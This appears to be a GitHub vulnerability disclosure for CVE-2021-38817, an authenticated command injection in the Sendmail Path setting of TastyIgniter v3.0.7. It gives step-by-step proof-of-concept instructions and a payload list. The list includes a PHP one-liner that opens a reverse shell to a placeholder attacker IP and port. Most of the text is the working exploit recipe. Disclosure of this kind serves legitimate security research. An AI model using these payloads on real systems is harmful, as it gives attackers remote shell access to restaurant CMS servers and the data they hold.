# CVE-2021-38817-Remote-OS-Command-Injection
Authenticated Remote OS Command Injection/Remote Code Execution in TastyIgniter v3.0.7 Sendmail web part (CVE-2021-38817)

An authenticated remote OS command injection vulnerability exists in the TastyIgniter v3.0.7 Restaurtant CMS Sendmail configuration menu for the web application. The Sendmail Path parameter is not sanitized properly, as indicated by the `/usr/sbin/sendmail -bs` command populated in the field, and allows arbitrary command to be injected by adding a semi-colon and an additional OS command.

## Affected Components

### URL: `/admin/settings/edit/mail`
### Field:
- Mail Protocol: Sendmail
- Field: Sendmail Path

## POC
- Authenticate to the /admin portal with credentials.
- Browse to `/admin/settings/edit/mail`
- In the `Mail Protocol` drop down menu, select `Sendmail`
- In the new `SendMail Path` field, add a semi-colon and an arbitrary OS command, i.e. `/usr/sbin/sendmail -bs; sleep 10`

## Payloads
- `/usr/sbin/sendmail -bs; sleep 10`
- `/usr/sbin/sendmail -bs; php -r '$sock=fsockopen("[IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
![TastyIgniterCVE](https://user-images.githubusercontent.com/57866415/129465103-f4a1349c-c25e-43c7-909c-711dcd332b06.gif)

## Discovered by
Matt Kiely (HuskyHacks) and Mike Padrick (Fearless), August 2021

CVE assigned Oct 2022 (lmfao)
